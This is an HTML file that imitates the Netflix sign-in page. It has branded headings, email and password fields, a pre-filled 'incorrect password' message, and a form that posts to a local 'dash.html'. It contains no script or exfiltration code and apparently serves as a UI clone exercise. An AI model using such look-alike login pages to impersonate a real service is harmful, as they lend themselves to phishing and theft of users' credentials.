<!DOCTYPE html>
<html lang="en">
</head>
<body>
    <h1 id="netflix">NETFLIX</h1>
    <div class="container">
        <h1 class="title">Sign In</h1>
        <span class="msg" id="msg-title">Incorrect Password for email@gmail.com</span>
       
        <link rel="stylesheet" href="style2.css">

        

        <form action="dash.html" method="POST">
            <div class="label">
                
                <input type="text" name="email" id="email" placeholder="Email or Phone Number">
            </div>
            <div class="label">
                
                <input type="password" name="password" id="password" placeholder="Password">
            </div>
            <button type="submit" class="sign-in-button">Sign In</button>
        </form>
        
        <p id="or">OR</p>
        <button class="sign-in-code-button">Use a Sign-In Code</button>
        
        <h3 id="forgot-password"><a href="#">Forgot password?</a></h3>
        
        <div class="remember">
            <input type="checkbox" name="remember" id="remember-checkbox">
            <label for="remember-checkbox">Remember me</label>  
        </div>
        
        <div class="sign-up">
            <p>New to Netflix? <a href="#">Sign-up now</a></p>
        </div>       
       
        <p id="bottom-msg">This page is protected by Google Captcha. <a href="#">Learn more.</a></p>
    </div>
